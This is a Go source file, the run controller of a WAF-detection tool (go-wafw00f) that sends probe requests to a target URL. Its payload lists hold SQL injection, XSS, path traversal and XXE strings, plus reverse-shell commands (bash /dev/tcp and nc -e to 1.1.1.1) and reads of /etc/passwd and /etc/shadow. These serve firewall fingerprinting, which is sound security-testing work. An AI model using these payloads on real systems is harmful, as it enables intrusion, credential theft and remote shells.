package controllers

import (
	"errors"
	"fmt"
	"strings"

	"github.com/ShangRui-hash/go-wafw00f/logger"
	"github.com/ShangRui-hash/go-wafw00f/retryhttp"
	"github.com/ShangRui-hash/go-wafw00f/settings"
	"github.com/ShangRui-hash/go-wafw00f/wafw00f"

	"github.com/sirupsen/logrus"
	cli "github.com/urfave/cli/v2"
)

var (
	sqlPayloads = []string{
		"?id=1'%20union%20select%1%20from%20information_schema.tables%20--+",
		"?id=1/**/and/**/1=(updatexml(1,concat(0x3a,(database())),1))%23",
		"?id=1%20and/**/if((select%20count(schema_name)+" +
			"from/**/information_schema.schemata)=9,sleep(5),1)--+",
	}
	xssPayloads = []string{
		"?id=1<script>alert('test');</script>",
		"?id=1<scRiPt src='http://xxx/xss.js'></scRiPt>",
		"?id=1<iframe onload=alert('xss')>",
	}
	rcePayloads = []string{
		"?cmd=/bin/cat+/etc/passwd",
		"?cmd=bash+-i+>&+/dev/tcp/1.1.1.1/111+0>&1",
		"?cmd=nc+-v+1.1.1.1+1111+-e+/bin/bash",
	}
	includePayload = "?file=../../../../etc/passwd"
	xxePayload     = "?id=<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn>"
)

func Run(c *cli.Context) error {
	if !strings.HasPrefix(settings.CurrentRunConf.URL, "http://") && !strings.HasPrefix(settings.CurrentRunConf.URL, "https://") {
		return errors.New("url must start with http:// or https://")
	}
	//0.初始化logger配置
	logger.Init(settings.CurrentRunConf.Debug, settings.CurrentRunConf.Silent)
	logrus.Debug("url:", settings.CurrentRunConf.URL)
	logrus.Info("Start go-wafw00f")
	//0.初始化retryhttp客户端
	if err := retryhttp.Init(); err != nil {
		logrus.Error("retryhttp init error:", err)
		return err
	}
	w00f := wafw00f.NewWafW00f()
	//1.解析waf识别规则文件
	if err := w00f.ParseJsonFile(settings.CurrentRunConf.RuleFilePath); err != nil {
		logrus.Error("waf.Init failed,err:", err)
		return err
	}
	//2.开始探测waf类型
	payloads := append(append(append(sqlPayloads, xssPayloads...), rcePayloads...), includePayload, xxePayload)
	res, err := w00f.DetectWaf(settings.CurrentRunConf.URL, payloads)
	if err != nil {
		logrus.Error("waf.DetectWaf failed,err:", err)
		return err
	}
	fmt.Println(res)
	return nil
}
